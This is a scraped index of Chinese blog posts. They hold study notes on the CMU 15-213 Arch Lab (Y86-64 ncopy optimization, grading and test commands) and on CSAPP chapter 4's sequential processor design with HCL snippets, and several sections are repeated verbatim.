count++ Npos: irmovq $1, %r10 subq %r10, %rdx # len-- irmovq $8, %r10 addq %r10, %rdi # src++ addq %r10, %rsi # dst++ andq %rdx,%rdx # len \u003e 0? jg Loop # if so, goto Loop: 首先我们利用新添加的iaddq指令，把所有的经过寄存器的加法都改成iaddq： asm # Loop header xorq %rax,%rax # count = 0; andq %rdx,%rdx # len \u003c= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val \u003c= 0? jle Npos # if so, goto Npos: iaddq $1, %rax # count++ Npos: iaddq $-1, %rdx # len-- iaddq $8, %rdi # src++ iaddq $8, %rsi # dst++ andq %rdx,%rdx # len \u003e 0? jg Loop # if so, goto Loop: 怎么直接满分了？啊？！不是应该继续优化的吗？ ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-c-实验记录"},{"categories":null,"content":" 22.3 Part C 编码规则你可以随意修改，但是有如下限制： 你的ncopy.ys函数必须对任意大小的数组都适用，不可以对某个长度的数组进行硬编码。 你的ncopy.ys必须在 YIS 上成功运行，成功的意思是成功的复制了数组，并且在%rax中返回了数组中正数的个数， 你的ncopy汇编文件不能大于 1000 个字节，你可以使用如下命令检查： bash ./check-len.pl \u003c ncopy.yo 你的pipe-full.hcl文件实现必须通过../y86-code和../ptest中的回归测试（不使用-i测试iaddq指令） 接下来你可以实现iaddq指令，修改时保证ncopy.ys的语义不改变。你可以阅读一下CSAPP 3e Section 5.8的循环展开。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:3","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-c-编码规则"},{"categories":null,"content":" 22.4 结果的构建与运行为了测试你的实现，你需要构造一个调用你nocpy函数的驱动程序。我们已经为你提供了一个gen-driver.pl程序，该程序生成一个输入为任意大小数组的驱动程序，输入如下命令： bash make drivers 构建如下两个驱动程序： sdriver.yo 使用一个 4 个元素的小数组进行测试 如果运行成功，最终%rax = 2 ldriver.yo 使用一个大的 63 个元素的数组进行测试 如果运行成功，最终%rax = 31 注意： 每次你修改ncopy.ys，你都可以重新输入make drivers来重新构建驱动程序 每次你修改pipe-full.hcl文件，你都可以输入make psim VERSION=full来重新构建模拟器 如果你想同时重新构建两者，输入make VERSION=full 要在 GUI 模式下测试你的小的 4 元素数组，输入./psim -g sdriver.yo 要在一个更大的 63 个元素的数组下测试，输入。/psim -g ldriver.yo 一旦你的模拟器能在这两个数组下成功运行ncopy.ys，你需要执行下面这些额外的测试： 在ISA模拟器上测试你的driver files，确保你的ncopy.ys函数能与YIS正常运行 bash make drivers ../misc/yis sdriver.yo 在不同大小的数组上测试ISA模拟器，perl脚本correctness.pl生成不同大小的driver files，它模拟它们，并且检查结果。他会生成一个显示最终结果的报告： bash ./correctness.pl 如果在某个长度的数组上失败了， 你可以使用如下方法测试： bash unix\u003e ./gen-driver.pl -f ncopy.ys -n K -rc \u003e driver.ys unix\u003e make driver.yo unix\u003e ../misc/yis driver.yo 返回值在%rax中，可能有如下几个值 0xaaaa：所有测试通过 0xbbbb：不正确 0xcccc：ncopy函数的长度超过了1000字节 0xdddd：部分源数据没有复制到目标地址 0xeeee：目标地址前后的数据被改变了 使用基准程序测试你的流水线模拟器，一旦你的模拟器能成功执行sdirver.ys和ldriver.ys，你应该使用../y86-code文件夹中的Y86-64基准程序： bash (cd ../y86-code; make testpsim) 这会在基准程序上运行psim，然后将结果与YIS进行比较 使用额外的回归测试来测试你的流水线模拟器。一旦你的模拟器能成功运行基准程序，那么你应该使用../ptest中的回归测试进行测试。比如你实现了iaddq指令，那么你可以执行如下命令进行测试： bash (cd ../ptest; make SIM=../pipe/psim TFLAGS=-i) 在不同的块长度下测试你的程序，你可以使用与之前测试ISA模拟器相同的指令： bash ./correctness.pl -p ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:4","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#结果的构建与运行"},{"categories":null,"content":" 23 评分细则整个实验 190 分，其中 Part A 30 分，Part B 60 分，Part C 100 分。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#评分细则"},{"categories":null,"content":" 23.1 Part A Part A 30分，其中每个Y86-64程序10分，其中每个程序都会被检测，包括对栈的处理和对寄存器的处理是否正确，以及和examples.c中的程序是否等效； 如果grader 没有在sum.ys和 rsum.ys中发现任何错误，并且对应的sum list和rsum list函数将0xcba保存在%rax中返回，被视为正确； 如果grader没有在copy.ys中发现任何错误，并且copy block function将返回值0xcba保存在%rax中返回，并且复制了3个64位值0x00a,0x0b,0xc到从dest开始的24个字节中，并且没有破坏其他地方的值，被视为正确； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:1","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-a-1"},{"categories":null,"content":" 23.2 Part BPart B 35分，其中10分给你对iaddq所需操作的描述，10分给y86代码通过基准regression tests，15分给iaddq通过ptest文件夹中的regression tests ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-b-1"},{"categories":null,"content":" 23.3 Part CPart C的分值是100，如果你在之前的测试中没有通过，那么你不会在这个阶段得到任何分数。 20分给ncopy.ys和pipe-full.hcl中的头文件中的描述，以及代码实现的质量； 60分给性能。也就是说ncopy需要成功在YIS下运行，并且pipe-full.hcl需要通过y86-code和ptest文件夹下的所有测试。 我们会使用CPE来测试ncopy的性能，也就是移动单位元素所花费的时钟周期。我们会使用多个不同长度的块来进行测试，使用如下命令完成 bash ./benchmark.pl 注意这个脚本不是用来测试正确性的，正确性应该用如下脚本进行测试： bash ./correctness.pl 你的目标应该是达到平均小于9.00的CPE，评分标准如下： c S = 0; // c \u003e 10.5 20*(10.5-c) // 7.5 \u003c= c \u003c= 10.5 60 // c \u003c 7.50 其中benchmark.pl和correctness.pl默认编译和测试ncopy.ys，但是还有如下几个可选项： bash -f # 测试其他文件 -h # 输出所有命令行参数 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:3","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-c-1"},{"categories":null,"content":" 24 提示 sdriver.yo和ldriver.yo非常小，可以在GUI模式下调试； 如果你在Unix的GUI模式下运行，你需要确保你已经初始化了DISPLAY环境变量 bash setenv DISPLAY myhost.edu:0 对于某些X servers，当你在GUI模式下运行psim或ssim时，Program Code窗口是个关闭图标。点击该图标就可以扩展窗口。 在某些微软操作系统下的X servers，Memory Contents窗口不会自动缩放，你需要手动缩放。 如果让psim和ssim模拟器去执行一个不是有效的Y86-64目标文件时，他们会报出段错误并终止执行。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:12:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#提示"},{"categories":["系统入门"],"content":"本章中我们需要实现 3 个目标： 设计一个顺序结构的 Y86_64 架构处理器 设计一个流水线结构的 Y86_64 架构处理器 设计一个包含冒险控制的 Y86_64 架构处理器 ","date":"2024-03-13","objectID":"/ch4/:0:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#"},{"categories":["系统入门"],"content":" 1 Y86_64 指令集架构Y86_64 指令集架构的基本格式如下： 1 字节的指令指示符，包含 4 位的代码段和 4 位的功能段 1 字节的寄存器指示符（部分指令没有） 8 个字节的常数（部分指令没有） 此外，Y86_64 指令集架构包含 16 个寄存器，编号为：0-F，其中F表示这条指令无需寄存器，此外%rsp寄存器的值为 4。并且 Y86_64 处理器的异常处理机制就是让处理器停止执行指令。 根据指令的不同特性，我们将其分为不同的类别来进行分析。指令的指令可以概括的分为 6 个阶段： 取指：从 PC 中取出指令，分割其内部字段，如icode、ifun，寄存器指示符rA和rB，立即数valC等等 译码：根据取指阶段各个字段，去寄存器中把值拿出来，得到两个数valA和valB 执行：将寄存器中拿出的值放入ALU计算单元，中途还需要判断icode和ifun等，计算出的值为valE 访存：访问内存，读出的值为valM 写回：将结果写回寄存器 更新 PC：根据不同指令更新 PC，默认的下一条指令地址为valP ","date":"2024-03-13","objectID":"/ch4/:1:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#y86_64-指令集架构"},{"categories":["系统入门"],"content":" 1.1 寄存器操作指令符合这个类别的指令包括：rrmovq，irmovq，OPq 将这三条指令按上述过程分析如下： 阶段 rrmovq irmovq OPq 取指 $icode:ifun\\leftarrow M_{1}[PC]$ $rA:rB\\leftarrow M_{1}[PC+1]$ $valP\\leftarrow PC+2$ $icode:ifun\\leftarrow M_{1}[PC]$ $rA:rB\\leftarrow M_{1}[PC+1]$ $valC\\leftarrow M_{8}[PC+2]$ $valP\\leftarrow PC + 10$ $icode:ifun\\leftarrow M_{1}[PC]$ $rA:rB\\leftarrow M_{1}[PC+1]$ $valP\\leftarrow PC+2$ 译码 $valA\\leftarrow R[rA]$ $valA\\leftarrow R[rA]$ $valB\\leftarrow R[rB]$ 执行 $valE\\leftarrow valB\\space OP\\space valA$ $valE\\leftarrow 0\\space OP\\space valC$ $valE\\leftarrow 0\\space OP\\space valA$ 访存 写回 $R[rB]\\leftarrow valE$ 更新 PC $PC\\leftarrow valP$ ","date":"2024-03-13","objectID":"/ch4/:1:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#寄存器操作指令"},{"categories":["系统入门"],"content":" 1.2 访存指令符合这个类别的指令包括：rmmovq，mrmovq，pushq，popq 阶段 rmmovq mrmovq pushq popq 取指 $icode:ifun\\leftarrow M_{1}[PC]$ $rA:rB\\leftarrow M_{1}[PC+1]$ $valC\\leftarrow M_{8}[PC+2]$ $valC\\leftarrow M_{8}[PC+2]$ $valP\\leftarrow PC+10$ $valP\\leftarrow PC+10$ $valP\\leftarrow PC+2$ $valP\\leftarrow PC+2$ 译码 $valA\\leftarrow R[rA]$ $valB\\leftarrow R[rB]$ $valB\\leftarrow R[rB]$ $valA\\leftarrow R[rA]$ $valB\\leftarrow R[rsp]$ $valA\\leftarrow R[rsp]$ $valB\\leftarrow R[rsp]$ 执行 $valE\\leftarrow valB+valC$ $valE\\leftarrow valB+valC$ $valE\\leftarrow valB+(-8)$ $valE\\leftarrow valB+8$ 访存 $M[valE]\\leftarrow valA$ $valM\\leftarrow M[valE]$ $M[valE]\\leftarrow valA$ $valM\\leftarrow M[valA]$ 写回 $R[rA]\\leftarrow valM$ $R[rsp]\\leftarrow valE$ $R[rsp]\\leftarrow valE$ $R[rA]\\leftarrow valM$ 更新 PC $PC\\leftarrow valP$ ","date":"2024-03-13","objectID":"/ch4/:1:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#访存指令"},{"categories":["系统入门"],"content":" 1.3 跳转，调用及返回指令符合这个类别的指令包括：jXX，cmovXX，call，ret。这些指令中的部分指令也需要访存，并且涉及到修改 PC。 阶段 call cmovXX jXX ret 取指 $icode:ifun\\leftarrow M_{1}[PC]$ $valC\\leftarrow M_{8}[PC+1]$ $valP\\leftarrow PC+9$ $icode:ifun\\leftarrow M_{1}[PC]$ $rA：rB\\leftarrow M_{1}[PC+1]$ $valP\\leftarrow PC+2$ $icode:ifun\\leftarrow M_{1}[PC]$ $valC\\leftarrow M_{8}[PC+1]$ $valP\\leftarrow PC+9$ $icode:ifun\\leftarrow M_{1}[PC]$ $valP\\leftarrow PC+1$ 译码 $valB\\leftarrow R[rsp]$ $valA\\leftarrow R[rA]$ $valA\\leftarrow R[rsp]$ $valB\\leftarrow R[rsp]$ 执行 $valE\\leftarrow valB+(-8)$ $Cnd\\leftarrow Cond(CC,ifun)$ $valE\\leftarrow valB+8$ 访存 $M[valE]\\leftarrow valP$ $valM\\leftarrow M[valA]$ 写回 $R[rsp]\\leftarrow valE$ $R[rB]\\leftarrow Cnd?valA$ $R[rsp]\\leftarrow valE$ 更新 PC $PC\\leftarrow valC$ $PC\\leftarrow valP$ $PC\\leftarrow Cnd?valC;valP$ $PC\\leftarrow valM$ ","date":"2024-03-13","objectID":"/ch4/:1:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#跳转调用及返回指令"},{"categories":["系统入门"],"content":" 1.4 其他指令符合这个类别的指令包括：halt，nop 阶段 halt nop 取指 $icode:ifun\\leftarrow M_{1}[PC]$ $valP\\leftarrow PC+1$ $icode:ifun\\leftarrow M_{1}[PC]$ $valP\\leftarrow PC+1$ 译码 执行 set CC 访存 写回 更新 PC $PC\\leftarrow valP$ $PC\\leftarrow valP$ ","date":"2024-03-13","objectID":"/ch4/:1:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#其他指令"},{"categories":["系统入门"],"content":" 2 顺序结构处理器 SEQ 实现","date":"2024-03-13","objectID":"/ch4/:2:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#顺序结构处理器-seq-实现"},{"categories":["系统入门"],"content":" 2.1 取指阶段取值阶段做的工作主要是从指令中抽出几个字段，然后对其进行判断，并且生成一些信号。 生成的字段包括： icode：所有指令都生成这个字段 ifun：所有指令都生成这个字段 rA：rrmovq,irmovq,OPq,rmmovq,mrmovq,pushq,popq,cmovXX rB：rrmovq,irmovq,OPq,rmmovq,mrmovq,pushq,popq,cmovXX valC：irmovq,mrmovq,rmmovq,jxx,call valP：所有指令都生成这个字段，但是其值不一样，根据icode和ifun来变化 其可以产生的信号包括： icode和ifun needReg，表示是否需要寄存器，其计算方式如下： hcl word needReg = icode in { IRRMOVQ,IIRMOVQ,IOPQ,IRMMOVQ,IMRMOVQ,IPUSHQ,IPOPQ }; needValC，表示是否需要立即数，其计算方式如下： hcl word needValC = icode in { IIRMOVQ,IMRMOVQ,IRMMOVQ,IJXX,ICALL }; $valP = pc + 1 + needReg + 8 * needValC$ 其可以产生的异常信号包括： 指令异常instr_valid 寄存器地址异常imem_error（需要将指令转化为nop） 我们在取值阶段的设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#取指阶段"},{"categories":["系统入门"],"content":" 2.2 译码阶段译码阶段主要产生实现寄存器的值读取，其可以读取到valA，valB。其值来源有多种，包括rA,rB,rsp。valA的值一般来源于rA，valB的值可能来源于rB，也可能来源于rsp。 我们的寄存器文件含有 2 个读端口，其读端口地址为srcA和srcB，读端口数据为valA和valB。还有一个写端口，写端口的地址为dstW，数据为valW。 在这个设计中，我们让valA进入srcA，valB进入srcB。 其中，srcA(valA)可能值为rA,rsp和RNONE，不同指令对应的hcl代码如下： hcl word srcA = [ icode in {IRRMOVQ,IOPQ,RMMOVQ,PUSHQ}:rA; icode in {IPOPQ,IRET}:RRSP; 1:RNONE; ]; srcB(valB)的可能值为rB和rsp和RNONE。其hcl代码如下： hcl word srcB = [ icode in {IOPQ,RMMOVQ,MRMOVQ}:rB; icode in {IPUSHQ,IPOPQ,IJXX,IRET}:RRSP; 1:RNONE; ] 我们在译码阶段的设计如图(RNONE 未画出)： ","date":"2024-03-13","objectID":"/ch4/:2:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#译码阶段"},{"categories":["系统入门"],"content":" 2.3 执行阶段执行阶段主要是利用运算器 ALU，其中我们由aluA和aluB进行ifun计算，得到valE。这一步需要： 计算出aluA和aluB 根据ifun的值来进行计算 设置条件码CC 产生结果valE。能是： 2.3.1 aluB和aluA的计算根据前述指令分析，aluB的来源可能是： valB:OPq,rmmovq,mrmovq,pushq,popq,call,ret 0:rrmovq,irmovq aluA的来源可能是： valA:OPq,rrmovq valC:irmovq,rmmovq,mrmovq -8:pushq,call 8:popq,ret 2.3.2 ifun计算只有在OPq指令中会用到ifun，其hcl代码为： hcl word alufun = [ icode == IOPQ:ifun; 1:ALUADD; ]; 2.3.3 条件码设置只有OPq指令设置条件码。因此hcl代码如下： hcl bool set_cc = icode in {IOPQ}; 2.3.4 执行阶段 ALU 设计执行阶段的 ALU 设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#执行阶段"},{"categories":["系统入门"],"content":" 2.3 执行阶段执行阶段主要是利用运算器 ALU，其中我们由aluA和aluB进行ifun计算，得到valE。这一步需要： 计算出aluA和aluB 根据ifun的值来进行计算 设置条件码CC 产生结果valE。能是： 2.3.1 aluB和aluA的计算根据前述指令分析，aluB的来源可能是： valB:OPq,rmmovq,mrmovq,pushq,popq,call,ret 0:rrmovq,irmovq aluA的来源可能是： valA:OPq,rrmovq valC:irmovq,rmmovq,mrmovq -8:pushq,call 8:popq,ret 2.3.2 ifun计算只有在OPq指令中会用到ifun，其hcl代码为： hcl word alufun = [ icode == IOPQ:ifun; 1:ALUADD; ]; 2.3.3 条件码设置只有OPq指令设置条件码。因此hcl代码如下： hcl bool set_cc = icode in {IOPQ}; 2.3.4 执行阶段 ALU 设计执行阶段的 ALU 设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#alub和alua的计算"},{"categories":["系统入门"],"content":" 2.3 执行阶段执行阶段主要是利用运算器 ALU，其中我们由aluA和aluB进行ifun计算，得到valE。这一步需要： 计算出aluA和aluB 根据ifun的值来进行计算 设置条件码CC 产生结果valE。能是： 2.3.1 aluB和aluA的计算根据前述指令分析，aluB的来源可能是： valB:OPq,rmmovq,mrmovq,pushq,popq,call,ret 0:rrmovq,irmovq aluA的来源可能是： valA:OPq,rrmovq valC:irmovq,rmmovq,mrmovq -8:pushq,call 8:popq,ret 2.3.2 ifun计算只有在OPq指令中会用到ifun，其hcl代码为： hcl word alufun = [ icode == IOPQ:ifun; 1:ALUADD; ]; 2.3.3 条件码设置只有OPq指令设置条件码。因此hcl代码如下： hcl bool set_cc = icode in {IOPQ}; 2.3.4 执行阶段 ALU 设计执行阶段的 ALU 设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#ifun计算"},{"categories":["系统入门"],"content":" 2.3 执行阶段执行阶段主要是利用运算器 ALU，其中我们由aluA和aluB进行ifun计算，得到valE。这一步需要： 计算出aluA和aluB 根据ifun的值来进行计算 设置条件码CC 产生结果valE。能是： 2.3.1 aluB和aluA的计算根据前述指令分析，aluB的来源可能是： valB:OPq,rmmovq,mrmovq,pushq,popq,call,ret 0:rrmovq,irmovq aluA的来源可能是： valA:OPq,rrmovq valC:irmovq,rmmovq,mrmovq -8:pushq,call 8:popq,ret 2.3.2 ifun计算只有在OPq指令中会用到ifun，其hcl代码为： hcl word alufun = [ icode == IOPQ:ifun; 1:ALUADD; ]; 2.3.3 条件码设置只有OPq指令设置条件码。因此hcl代码如下： hcl bool set_cc = icode in {IOPQ}; 2.3.4 执行阶段 ALU 设计执行阶段的 ALU 设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#条件码设置"},{"categories":["系统入门"],"content":" 2.3 执行阶段执行阶段主要是利用运算器 ALU，其中我们由aluA和aluB进行ifun计算，得到valE。这一步需要： 计算出aluA和aluB 根据ifun的值来进行计算 设置条件码CC 产生结果valE。能是： 2.3.1 aluB和aluA的计算根据前述指令分析，aluB的来源可能是： valB:OPq,rmmovq,mrmovq,pushq,popq,call,ret 0:rrmovq,irmovq aluA的来源可能是： valA:OPq,rrmovq valC:irmovq,rmmovq,mrmovq -8:pushq,call 8:popq,ret 2.3.2 ifun计算只有在OPq指令中会用到ifun，其hcl代码为： hcl word alufun = [ icode == IOPQ:ifun; 1:ALUADD; ]; 2.3.3 条件码设置只有OPq指令设置条件码。因此hcl代码如下： hcl bool set_cc = icode in {IOPQ}; 2.3.4 执行阶段 ALU 设计执行阶段的 ALU 设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#执行阶段-alu-设计"},{"categories":["系统入门"],"content":" 2.4 访存阶段 2.4.1 存储器结构访存阶段需要访问到我们的数据内存，而数据内存的结构是： 一个读写信号 一个访存地址错误信号(取指阶段获取的mem_error) 一个地址 一个写数据输入 一个读数据输出 时钟 2.4.2 存储器读涉及到对存储器的读的指令包括mrmovq,popq,ret 其读出的地址为：valE,valA 读出的数据保存到valM 2.4.3 存储器写涉及到对存储器写的指令包括rmmovq,pushq,call 其写入的地址为：valE 写入的数据为：valA,valP 2.4.4 访存阶段设计 读控制信号 hcl word mem_read = icode in {IMRMOVQ, IPOPQ, IRET}; 写控制信号 hcl word mem_write = icode in {IRMMOVQ, IPUSHQ, ICALL}; 写数据信号(valA,valP) hcl word mem_data = [ icode in {IRMMMOVQ,IPUSHQ}: valA; icode in {ICALL}: valP; ]; 地址信号(valE,valA) hcl word mem_addr = [ icode in {IMRMOVQ,IRMMOVQ,IPUSH,ICALL}: valE; icode in {IPOPQ,IRET}: valA; ]; 生成状态信号 取值阶段给出icode，imem_error，instr_valid 生成dmem_error内存访问错误信号 Stat状态码：SAOK,SADR,SINS,SHLT 访存阶段设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#访存阶段"},{"categories":["系统入门"],"content":" 2.4 访存阶段 2.4.1 存储器结构访存阶段需要访问到我们的数据内存，而数据内存的结构是： 一个读写信号 一个访存地址错误信号(取指阶段获取的mem_error) 一个地址 一个写数据输入 一个读数据输出 时钟 2.4.2 存储器读涉及到对存储器的读的指令包括mrmovq,popq,ret 其读出的地址为：valE,valA 读出的数据保存到valM 2.4.3 存储器写涉及到对存储器写的指令包括rmmovq,pushq,call 其写入的地址为：valE 写入的数据为：valA,valP 2.4.4 访存阶段设计 读控制信号 hcl word mem_read = icode in {IMRMOVQ, IPOPQ, IRET}; 写控制信号 hcl word mem_write = icode in {IRMMOVQ, IPUSHQ, ICALL}; 写数据信号(valA,valP) hcl word mem_data = [ icode in {IRMMMOVQ,IPUSHQ}: valA; icode in {ICALL}: valP; ]; 地址信号(valE,valA) hcl word mem_addr = [ icode in {IMRMOVQ,IRMMOVQ,IPUSH,ICALL}: valE; icode in {IPOPQ,IRET}: valA; ]; 生成状态信号 取值阶段给出icode，imem_error，instr_valid 生成dmem_error内存访问错误信号 Stat状态码：SAOK,SADR,SINS,SHLT 访存阶段设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#存储器结构"},{"categories":["系统入门"],"content":" 2.4 访存阶段 2.4.1 存储器结构访存阶段需要访问到我们的数据内存，而数据内存的结构是： 一个读写信号 一个访存地址错误信号(取指阶段获取的mem_error) 一个地址 一个写数据输入 一个读数据输出 时钟 2.4.2 存储器读涉及到对存储器的读的指令包括mrmovq,popq,ret 其读出的地址为：valE,valA 读出的数据保存到valM 2.4.3 存储器写涉及到对存储器写的指令包括rmmovq,pushq,call 其写入的地址为：valE 写入的数据为：valA,valP 2.4.4 访存阶段设计 读控制信号 hcl word mem_read = icode in {IMRMOVQ, IPOPQ, IRET}; 写控制信号 hcl word mem_write = icode in {IRMMOVQ, IPUSHQ, ICALL}; 写数据信号(valA,valP) hcl word mem_data = [ icode in {IRMMMOVQ,IPUSHQ}: valA; icode in {ICALL}: valP; ]; 地址信号(valE,valA) hcl word mem_addr = [ icode in {IMRMOVQ,IRMMOVQ,IPUSH,ICALL}: valE; icode in {IPOPQ,IRET}: valA; ]; 生成状态信号 取值阶段给出icode，imem_error，instr_valid 生成dmem_error内存访问错误信号 Stat状态码：SAOK,SADR,SINS,SHLT 访存阶段设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#存储器读"},{"categories":["系统入门"],"content":" 2.4 访存阶段 2.4.1 存储器结构访存阶段需要访问到我们的数据内存，而数据内存的结构是： 一个读写信号 一个访存地址错误信号(取指阶段获取的mem_error) 一个地址 一个写数据输入 一个读数据输出 时钟 2.4.2 存储器读涉及到对存储器的读的指令包括mrmovq,popq,ret 其读出的地址为：valE,valA 读出的数据保存到valM 2.4.3 存储器写涉及到对存储器写的指令包括rmmovq,pushq,call 其写入的地址为：valE 写入的数据为：valA,valP 2.4.4 访存阶段设计 读控制信号 hcl word mem_read = icode in {IMRMOVQ, IPOPQ, IRET}; 写控制信号 hcl word mem_write = icode in {IRMMOVQ, IPUSHQ, ICALL}; 写数据信号(valA,valP) hcl word mem_data = [ icode in {IRMMMOVQ,IPUSHQ}: valA; icode in {ICALL}: valP; ]; 地址信号(valE,valA) hcl word mem_addr = [ icode in {IMRMOVQ,IRMMOVQ,IPUSH,ICALL}: valE; icode in {IPOPQ,IRET}: valA; ]; 生成状态信号 取值阶段给出icode，imem_error，instr_valid 生成dmem_error内存访问错误信号 Stat状态码：SAOK,SADR,SINS,SHLT 访存阶段设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#存储器写"},{"categories":["系统入门"],"content":" 2.4 访存阶段 2.4.1 存储器结构访存阶段需要访问到我们的数据内存，而数据内存的结构是： 一个读写信号 一个访存地址错误信号(取指阶段获取的mem_error) 一个地址 一个写数据输入 一个读数据输出 时钟 2.4.2 存储器读涉及到对存储器的读的指令包括mrmovq,popq,ret 其读出的地址为：valE,valA 读出的数据保存到valM 2.4.3 存储器写涉及到对存储器写的指令包括rmmovq,pushq,call 其写入的地址为：valE 写入的数据为：valA,valP 2.4.4 访存阶段设计 读控制信号 hcl word mem_read = icode in {IMRMOVQ, IPOPQ, IRET}; 写控制信号 hcl word mem_write = icode in {IRMMOVQ, IPUSHQ, ICALL}; 写数据信号(valA,valP) hcl word mem_data = [ icode in {IRMMMOVQ,IPUSHQ}: valA; icode in {ICALL}: valP; ]; 地址信号(valE,valA) hcl word mem_addr = [ icode in {IMRMOVQ,IRMMOVQ,IPUSH,ICALL}: valE; icode in {IPOPQ,IRET}: valA; ]; 生成状态信号 取值阶段给出icode，imem_error，instr_valid 生成dmem_error内存访问错误信号 Stat状态码：SAOK,SADR,SINS,SHLT 访存阶段设计如图： ","date":"2024-03-13","objectID":"/ch4/:2:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#访存阶段设计"},{"categories":["系统入门"],"content":" 2.5 写回阶段写回阶段只能写回两种值，要么是执行阶段产生的valE，要么是访存阶段产生的valM。因此，寄存器上可以有 2 个写端口，一个dstE，一个dstM。并且包含两个数据端口。 dstE写入的地址有： 写入rB:rrmovq,irmovq,OPq 写入rsp:push,pop,call,ret 其hcl代码如下： hcl word dstE = [ icode in {IRRMOVQ,IIRMOVQ,IOPQ}: rB; icode in {IPUSHQ,IPOPQ,ICALL,IRET}: RRSP; 1: RNONE ]; dstM写入的地址有rA:mrmovq,popq。 其hcl代码如下： hcl word dstM = [ icode in {IMRMOVQ,IPOPQ}: rA; 1:RNONE; ]; 在译码阶段基础上修改如下(RNONE 未画出)： ","date":"2024-03-13","objectID":"/ch4/:2:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#写回阶段"},{"categories":["系统入门"],"content":" 2.6 更新 PCPC 的值有以下几种可能： valP: 正常的下一条指令。主要来源于rrmovq,irmovq,OPq,rmmovq,mrmovq,pushq,popq valC: 跳转指令规定的特定指令地址。主要来源于call valM: ret时的返回地址。主要来源于ret 此外，jxx指令的结果是valC还是valP需要视察Cnd而定。 因此，PC 的值的更新需要几个信号： icode Cnd 其hcl代码如下： hcl word new_pc = [ icode == ICALL: valC; icode == IJXX \u0026\u0026 Cnd: valC; icode == IRET: valM; 1: valP; ] PC 更新部分设计如下： ","date":"2024-03-13","objectID":"/ch4/:2:6","series":["15-213"],"tags":null,"title":"CSAPP 